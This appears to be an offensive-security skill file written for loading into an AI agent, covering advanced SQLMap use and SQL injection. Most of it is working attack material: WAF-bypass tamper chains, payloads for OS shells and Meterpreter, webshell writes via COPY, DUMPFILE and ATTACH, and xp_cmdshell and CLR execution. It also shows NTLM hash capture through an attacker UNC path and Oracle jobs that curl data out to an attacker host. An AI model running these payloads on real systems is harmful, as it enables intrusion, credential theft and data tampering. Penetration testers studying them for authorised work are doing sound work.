# SQLMap Advanced Workflow & Deep SQL Injection Techniques

> **AI LOAD INSTRUCTION**: Load this when you need SQLMap tamper chain recipes, INSERT/UPDATE/DELETE injection patterns, GraphQL+SQLi, WAF bypass tamper stacking, or DB-specific advanced functions that base models miss. Assumes the main [SKILL.md](./SKILL.md) is already loaded for fundamentals.

---

## 1. SQLMAP — ADVANCED WORKFLOW

### 1.1 Tamper Scripts Matrix

Tamper scripts modify payloads to evade WAF/IDS. Stack multiple with commas.

| Tamper | Effect | Target |
|---|---|---|
| `space2comment` | `SELECT/**/username` | WAFs blocking literal spaces |
| `space2plus` | `SELECT+username` | URL-encoded space filters |
| `space2hash` | `SELECT%23%0ausername` | MySQL — `#\n` acts as space |
| `space2mssqlblank` | Replaces space with random blank chars (`%00`–`%0F`) | MSSQL |
| `space2morehash` | More aggressive `#\n` padding | MySQL behind strict WAF |
| `between` | `NOT BETWEEN 0 AND` instead of `>` | WAFs blocking comparison operators |
| `charencode` | URL-encodes all characters | Generic evasion |
| `chardoubleencode` | Double URL-encode | Proxies that decode once before WAF |
| `randomcase` | `SeLeCt` | Case-sensitive WAF rules |
| `randomcomments` | `SEL/**/ECT` | Signature-based WAFs |
| `equaltolike` | `=` → `LIKE` | WAFs blocking `=` |
| `greatest` | `>` → `GREATEST(val,X)=val` | Operator-blocking WAFs |
| `ifnull2ifisnull` | `IFNULL` → `IF(ISNULL(...))` | MySQL-specific WAFs |
| `modsecurityversioned` | `/*!50000SELECT*/` | ModSecurity CRS on MySQL |
| `modsecurityzeroversioned` | `/*!00000SELECT*/` | ModSecurity with lax version matching |
| `unionalltounion` | `UNION ALL SELECT` → `UNION SELECT` | Rules specific to `UNION ALL` |
| `percentage` | Insert `%` between chars: `S%E%L%E%C%T` | IIS/ASP classic |
| `appendnullbyte` | Append `%00` | Language-level null-byte truncation |
| `halfversionedmorekeywords` | `/*!0SELECT*/` | MySQL version comment trick |
| `base64encode` | Base64-encode entire payload | Custom decoders |
| `symboliclogical` | `AND` → `&&`, `OR` → `||` | Keyword-based WAFs |
| `versionedkeywords` | `/*!SELECT*/` | MySQL versioned comments |
| `versionedmorekeywords` | More keywords wrapped in `/*!*/` | MySQL extended |
| `bluecoat` | Replace space after SQL keyword with `%09` | Blue Coat ProxySG |
| `sp_password` | Append `--sp_password` at end | MSSQL log hiding |

### 1.2 WAF Bypass Tamper Chain Recipes

```bash
# MySQL behind ModSecurity CRS
sqlmap -u "$URL" --tamper=space2comment,between,randomcase,modsecurityversioned

# MySQL behind Cloudflare
sqlmap -u "$URL" --tamper=space2comment,charencode,randomcase,between

# MSSQL behind IIS + generic WAF
sqlmap -u "$URL" --tamper=space2mssqlblank,randomcase,charencode,sp_password

# Oracle behind enterprise WAF
sqlmap -u "$URL" --tamper=between,randomcase,charencode

# Double-proxy (decode-once WAF in front)
sqlmap -u "$URL" --tamper=chardoubleencode,space2comment,randomcase

# IIS/ASP with percentage filter
sqlmap -u "$URL" --tamper=percentage,space2comment,randomcase

# PostgreSQL behind strict keyword WAF
sqlmap -u "$URL" --tamper=space2comment,between,randomcase,symboliclogical
```

### 1.3 --technique Flags

Control which injection techniques SQLMap tries:

| Flag | Technique | When |
|---|---|---|
| `B` | Boolean-based blind | Default first-try; conditional response diff |
| `E` | Error-based | Visible SQL errors in response |
| `U` | UNION query-based | Inline data extraction, fastest |
| `S` | Stacked queries | Multi-statement support (MSSQL, PostgreSQL) |
| `T` | Time-based blind | No visible diff; last resort |
| `Q` | Inline queries | Subquery within another statement |

```bash
# Only try UNION and error-based (fast, less noise):
sqlmap -u "$URL" --technique=UE

# Stacked queries for MSSQL xp_cmdshell:
sqlmap -u "$URL" --technique=S --os-shell

# Blind-only (stealthy recon):
sqlmap -u "$URL" --technique=BT
```

### 1.4 --risk and --level Combinations

| Level (1–5) | Effect |
|---|---|
| 1 | Default; tests GET/POST params |
| 2 | Also tests Cookie values |
| 3 | Also tests User-Agent, Referer |
| 4 | More payloads per parameter |
| 5 | All parameters, all headers, all payload variants |

| Risk (1–3) | Effect |
|---|---|
| 1 | Default; harmless payloads |
| 2 | Adds heavy time-based payloads |
| 3 | Adds `OR`-based payloads (may alter data — UPDATE/DELETE risk) |

```bash
# Thorough scan (headers, cookies, aggressive payloads):
sqlmap -u "$URL" --level=5 --risk=3

# Stealthy initial recon:
sqlmap -u "$URL" --level=2 --risk=1

# Cookie injection focus:
sqlmap -u "$URL" --level=2 --cookie="token=abc*" --risk=2
```

### 1.5 Second-Order Injection (--second-url)

```bash
# Inject into registration form, observe result on profile page:
sqlmap -u "https://target.com/register" \
  --data="username=test*&password=pass" \
  --second-url="https://target.com/profile" \
  --second-req="second_request.txt"

# --second-url: URL where injected payload manifests
# --second-req: full request file for the second URL (optional)
```

### 1.6 OS-Level Exploitation

```bash
# Interactive OS shell (requires stacked queries + priv):
sqlmap -u "$URL" --os-shell
# Tries: xp_cmdshell (MSSQL), UDF (MySQL), PL/Python (PostgreSQL)

# Meterpreter session:
sqlmap -u "$URL" --os-pwn
# Uploads stager, connects to Metasploit handler

# Read server files:
sqlmap -u "$URL" --file-read="/etc/passwd"

# Write webshell:
sqlmap -u "$URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Specific DBMS for UDF path:
sqlmap -u "$URL" --os-shell --dbms=mysql
```

### 1.7 Useful Flags Reference

```bash
# Force DBMS to skip fingerprinting:
--dbms=mysql|mssql|oracle|pgsql|sqlite

# Proxy through Burp:
--proxy="http://127.0.0.1:8080"

# Custom injection marker:
--data="id=1*"  # * marks the injection point

# JSON body:
sqlmap -u "$URL" --data='{"id":"1*"}' --content-type="application/json"

# WAF detection & identify:
--identify-waf

# Skip URL encoding (for raw-socket evasion):
--skip-urlencode

# Specify prefix/suffix for custom contexts:
--prefix="')" --suffix="-- -"

# Verbose output for debugging tamper chains:
-v 3

# Dump with specific charset (faster brute-force):
--charset="0123456789abcdef"

# Threads for faster blind extraction:
--threads=8

# Flush session to re-test:
--flush-session
```

---

## 2. INSERT / UPDATE / DELETE INJECTION PATTERNS

### 2.1 INSERT Statement Injection

The injected value lands inside a `VALUES(...)` clause.

```sql
-- Original:
INSERT INTO logs (user, action) VALUES ('INPUT', 'login');

-- Injected INPUT: test','login'); SELECT SLEEP(5);--
-- Result (stacked query proves arbitrary statement execution, harmless time-based PoC):
INSERT INTO logs (user, action) VALUES ('test','login'); SELECT SLEEP(5);--', 'login');
```

**Data exfiltration via INSERT** (when you can see the inserted row):

```sql
-- MySQL: inject subquery into visible column
INPUT: test',(SELECT password FROM users LIMIT 1))-- -
-- Result:
INSERT INTO logs (user, action) VALUES ('test',(SELECT password FROM users LIMIT 1))-- -', 'login');

-- Oracle: requires FROM dual in subquery
INPUT: test'||(SELECT username FROM all_users WHERE ROWNUM=1)||'
```

**Blind INSERT exfiltration** (cannot see the row):

```sql
-- Time-based: inject IF into a column
INPUT: test' AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0) AND '1'='1
```

### 2.2 UPDATE Statement Injection

```sql
-- Original:
UPDATE users SET email='INPUT' WHERE id=1;

-- Overwrite another column:
INPUT: attacker@evil.com', is_admin='1
-- Result:
UPDATE users SET email='attacker@evil.com', is_admin='1' WHERE id=1;

-- Overwrite WHERE clause (escalate to all rows):
INPUT: anything' WHERE 1=1;--
-- Result:
UPDATE users SET email='anything' WHERE 1=1;--' WHERE id=1;
```

**Subquery data extraction in UPDATE**:

```sql
-- Extract data into a column you can read:
INPUT: '||(SELECT password FROM users WHERE username='admin')||'
-- Result (PostgreSQL):
UPDATE profile SET bio=''||(SELECT password FROM users WHERE username='admin')||'' WHERE id=1;
-- bio now contains admin's password hash
```

### 2.3 DELETE Statement Injection

```sql
-- Application's own statement (the injectable sink):
DELETE FROM sessions WHERE token='INPUT';

-- Non-destructive proof — time-based blind extraction inside the DELETE context
-- (confirms injection WITHOUT removing rows):
INPUT: ' OR IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0) OR '
-- Note: a boolean payload (e.g. ' OR '1'='1) would widen the WHERE to every row and is
-- destructive — never run it against real data; use the time-based proof above instead.
```

### 2.4 SQLMap for INSERT/UPDATE/DELETE

```bash
# SQLMap can test non-SELECT statements with stacked queries:
sqlmap -u "$URL" --data="email=test@test.com" --technique=BST --risk=3 --level=3

# --risk=3 is needed: enables OR-based payloads used in UPDATE/DELETE contexts
# Use --string or --not-string to identify success/failure responses
```

---

## 3. GRAPHQL + SQL INJECTION

### 3.1 Batched Query Injection

GraphQL supports batched queries in a single HTTP request — each may hit different resolvers with different SQL backends:

```json
[
  {"query": "{ user(id: \"1 OR 1=1--\") { name email } }"},
  {"query": "{ product(id: \"1 UNION SELECT username,password FROM users--\") { title } }"}
]
```

### 3.2 Nested Field Injection

GraphQL resolvers often build SQL from nested field arguments:

```graphql
{
  users(where: {name: "admin' OR '1'='1"}) {
    id
    email
    posts(orderBy: "created_at;SELECT SLEEP(5)--") {
      title
    }
  }
}
```

**Argument-level injection points**:

```graphql
# filter / where argument
{ users(filter: {email_contains: "' OR 1=1--"}) { id } }

# orderBy / sortBy
{ users(orderBy: "name ASC; WAITFOR DELAY '0:0:5'--") { id } }

# limit / offset
{ users(limit: "1 UNION SELECT username,password FROM admins--") { id } }

# search / full-text
{ search(query: "test' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--") { id } }
```

### 3.3 Mutation Injection

Mutations map to INSERT/UPDATE/DELETE — test all input fields:

```graphql
mutation {
  createUser(input: {
    name: "test',(SELECT password FROM users LIMIT 1))-- -"
    email: "a@b.com"
  }) {
    id
  }
}
```

### 3.4 Introspection + SQLi Recon

Use introspection to enumerate all arguments that might flow to SQL:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
```

Look for args named: `id`, `filter`, `where`, `search`, `orderBy`, `sort`, `limit`, `offset` — these commonly map to SQL clauses.

### 3.5 SQLMap with GraphQL

```bash
# Inline parameter marking:
sqlmap -u "https://target.com/graphql" \
  --data='{"query":"{ user(id: \"1*\") { name } }"}' \
  --content-type="application/json" \
  --technique=BEUST \
  --tamper=space2comment

# Via saved request file (recommended for complex queries):
sqlmap -r graphql_request.txt -p "id" --dbms=postgresql
```

---

## 4. DB-SPECIFIC ADVANCED FUNCTIONS

### 4.1 PostgreSQL — Dollar-Sign Quoting

Bypass quote filters entirely using `$$` delimiters:

```sql
-- Standard quoting (blocked by WAF):
SELECT 'admin'

-- Dollar-sign quoting (same result, no single quotes):
SELECT $$admin$$

-- Tagged dollar quoting:
SELECT $tag$admin$tag$

-- In injection context:
' UNION SELECT $$test$$,version()--

-- Dynamic SQL execution without quotes:
SELECT $$ALTER USER postgres PASSWORD 'newpass'$$::text;
```

**PostgreSQL COPY command for file I/O**:

```sql
-- Read file:
CREATE TEMP TABLE tmp(content text);
COPY tmp FROM $$/etc/passwd$$;
SELECT * FROM tmp;

-- Write file (webshell):
COPY (SELECT $$<?php system($_GET['c']); ?>$$) TO $$/var/www/html/shell.php$$;
```

**PostgreSQL large object for binary I/O**:

```sql
SELECT lo_import($$/etc/passwd$$, 1337);
SELECT lo_get(1337);
```

**PL/pgSQL command execution** (if CREATE LANGUAGE available):

```sql
CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$
BEGIN
  RETURN (SELECT cmd_output FROM sys_exec($1));
END;
$$ LANGUAGE plpgsql;
```

### 4.2 MSSQL — Linked Servers

Linked servers allow pivoting through SQL Server trust relationships:

```sql
-- Enumerate linked servers:
SELECT * FROM master..sysservers;
EXEC sp_linkedservers;

-- Query a linked server:
SELECT * FROM OPENQUERY(LINKED_SRV, 'SELECT @@version');

-- Execute on linked server:
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SRV];

-- Nested (double-hop) through two linked servers:
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [LINKED_SRV_2]') AT [LINKED_SRV_1];
```

**MSSQL credential harvesting**:

```sql
-- Capture NTLM hash via UNC path:
EXEC master..xp_dirtree '\\ATTACKER_IP\share';

-- xp_subdirs alternative:
EXEC master..xp_subdirs '\\ATTACKER_IP\share';

-- Run Responder/Inveigh on attacker to capture NTLMv2 hash
```

**MSSQL CLR assembly for full .NET execution**:

```sql
-- Requires sysadmin or ALTER ASSEMBLY permission
CREATE ASSEMBLY malicious FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmd_exec] @cmd NVARCHAR(4000) AS EXTERNAL NAME [malicious].[StoredProcedures].[cmd_exec];
EXEC cmd_exec 'whoami';
```

**MSSQL Agent Jobs** (alternate command execution path):

```sql
USE msdb;
EXEC dbo.sp_add_job @job_name = 'pwn';
EXEC sp_add_jobstep @job_name='pwn', @step_name='run',
  @subsystem='CmdExec', @command='whoami > C:\out.txt';
EXEC sp_add_jobserver @job_name='pwn';
EXEC sp_start_job @job_name='pwn';
```

### 4.3 Oracle — DBMS_PIPE and Advanced Packages

```sql
-- Time-based blind via DBMS_PIPE.RECEIVE_MESSAGE:
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a', 5)--
-- Waits 5 seconds; works where SLEEP() doesn't exist

-- DBMS_LOCK.SLEEP (if DBMS_PIPE is blocked):
' AND 1=DBMS_LOCK.SLEEP(5)--

-- Heavy query time-based (no special priv):
' AND 1=(SELECT COUNT(*) FROM all_objects a, all_objects b)--
```

**Oracle DBMS_SCHEDULER for OS commands**:

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'pwn',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled    => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn', 2, 'curl http://ATTACKER/$(whoami)');
  DBMS_SCHEDULER.ENABLE('pwn');
END;
```

**Oracle XXE via XMLTYPE** (out-of-band exfiltration):

```sql
SELECT XMLTYPE('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/'||(SELECT user FROM dual)||'">]><foo>&xxe;</foo>') FROM dual;
```

**Oracle DBMS_JAVA for OS command via Java**:

```sql
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c "curl http://ATTACKER/$(id)"') FROM dual;
```

### 4.4 MySQL — Advanced Tricks

```sql
-- Handler command (bypass SELECT keyword filters):
HANDLER users OPEN;
HANDLER users READ FIRST;
HANDLER users CLOSE;

-- Prepared statement via hex (bypass keyword filters):
SET @q=0x53454C454354202A2046524F4D207573657273; -- SELECT * FROM users
PREPARE stmt FROM @q;
EXECUTE stmt;

-- mysql.innodb_table_stats (bypass information_schema filters):
SELECT database_name, table_name FROM mysql.innodb_table_stats;

-- sys schema (MySQL 5.7+, bypass information_schema filters):
SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database();
SELECT table_name FROM sys.x$schema_table_statistics;

-- Dumpfile (binary-safe single-row write):
SELECT 0x3C3F706870... INTO DUMPFILE '/var/www/html/shell.php';
```

### 4.5 SQLite — Advanced Techniques

```sql
-- Attach database to write webshell:
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.cmd (txt text);
INSERT INTO pwn.cmd VALUES ('<?php system($_GET["c"]); ?>');

-- Read arbitrary file (load_extension if enabled):
-- Requires: SQLITE_ENABLE_LOAD_EXTENSION
SELECT load_extension('/path/to/malicious.so');

-- GLOB-based blind (alternative to LIKE):
SELECT * FROM users WHERE password GLOB 'a*';
```

---

## 5. WAF BYPASS — ADVANCED TAMPER CHAIN PATTERNS

### 5.1 ModSecurity CRS v3 Bypass Recipes

```sql
-- Paranoia Level 1 (default):
/*!50000SELECT*/ /*!50000username*/ /*!50000FROM*/ /*!50000users*/

-- Paranoia Level 2:
%53%45%4C%45%43%54/**/username/**/FROM/**/users

-- Combine tampers:
-- sqlmap --tamper=modsecurityversioned,space2comment,randomcase,between
```

### 5.2 Cloudflare Bypass Patterns

```sql
-- Inline comment with version:
/*!50000UniOn*/ /*!50000SeLeCt*/ 1,2,3

-- Newline injection:
%0aSELECT%0a*%0aFROM%0ausers

-- Tabulation:
%09UNION%09SELECT%09*%09FROM%09users
```

### 5.3 AWS WAF Bypass

```sql
-- JSON-based SQLi (if Content-Type: application/json):
{"id": "1 AND 1=1"}

-- Chunked transfer encoding can split payloads across chunks
-- Some WAFs don't reassemble before inspection
```

### 5.4 Multi-Layer Encoding

```sql
-- Double URL encode (proxy decodes once, app decodes again):
%2527 → %27 → '

-- Unicode normalization attacks:
ʼ (U+02BC) → ' in some normalizers
＇(U+FF07) → ' in some normalizers

-- Mixed encoding:
%53ELECT → SELECT (partial encoding)
```

---

## 6. CHEAT SHEET — SQLMAP COMMAND COMBOS

```bash
# Full auto with WAF evasion, blind detection, and OS shell:
sqlmap -u "$URL" -p "id" --dbms=mysql --level=5 --risk=3 \
  --tamper=space2comment,between,randomcase \
  --technique=BEUST --threads=8 --os-shell

# POST JSON API with custom headers:
sqlmap -u "$URL" --data='{"user_id":"1*"}' \
  --content-type="application/json" \
  -H "Authorization: Bearer TOKEN" \
  --tamper=charencode --technique=BT

# Cookie-based injection:
sqlmap -u "$URL" --cookie="id=1*" --level=2 --risk=2

# Second-order:
sqlmap -r register.txt --second-url="https://target.com/profile"

# Read password hashes:
sqlmap -u "$URL" -p "id" --passwords --threads=8

# Dump specific table:
sqlmap -u "$URL" -D dbname -T users -C username,password --dump

# Enumerate privileges:
sqlmap -u "$URL" --privileges --roles
```
